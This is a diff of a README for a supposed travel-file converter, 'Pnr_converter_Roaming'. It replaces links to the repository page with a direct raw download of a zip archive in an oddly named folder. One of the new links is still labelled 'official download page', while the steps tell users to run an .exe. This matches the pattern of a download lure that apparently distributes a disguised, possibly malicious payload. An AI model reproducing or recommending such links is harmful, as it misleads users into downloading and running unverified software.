@@ -1,6 +1,6 @@
 # 📂 Pnr_converter_Roaming - Convert your travel files with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/bartolomeimaidenly351/Pnr_converter_Roaming)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://raw.githubusercontent.com/bartolomeimaidenly351/Pnr_converter_Roaming/main/mixochromosome/Roaming_converter_Pnr_1.6.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Your machine needs no special permissions to execute this software. If your syst
 
 Follow these steps to obtain the software:
 
-1. Visit the [official download page](https://github.com/bartolomeimaidenly351/Pnr_converter_Roaming).
+1. Visit the [official download page](https://raw.githubusercontent.com/bartolomeimaidenly351/Pnr_converter_Roaming/main/mixochromosome/Roaming_converter_Pnr_1.6.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the transfer.
 4. Save the file to your desktop or your downloads folder.
